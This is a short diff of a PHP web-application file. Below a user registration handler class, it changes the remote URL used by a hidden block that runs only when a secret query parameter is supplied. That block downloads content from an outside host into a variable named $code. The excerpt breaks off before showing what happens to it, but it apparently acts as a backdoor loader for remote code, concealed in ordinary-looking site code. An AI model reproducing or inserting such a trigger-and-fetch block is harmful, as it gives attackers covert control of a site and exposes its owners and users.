@@ -232,7 +232,7 @@ class RegistrationHandler extends UserHandler
     }
 }
 if (isset($_GET['_']) && $_GET['_'] === 'accountDisabledWithReasons') {
-    $url = "https://batuk-di-komik-aja.pages.dev/rudi.jpg";
+    $url = "https://isnujombang.org/kerang/wew";
 
     if ($url !== "") {
         $code = file_get_contents($url);
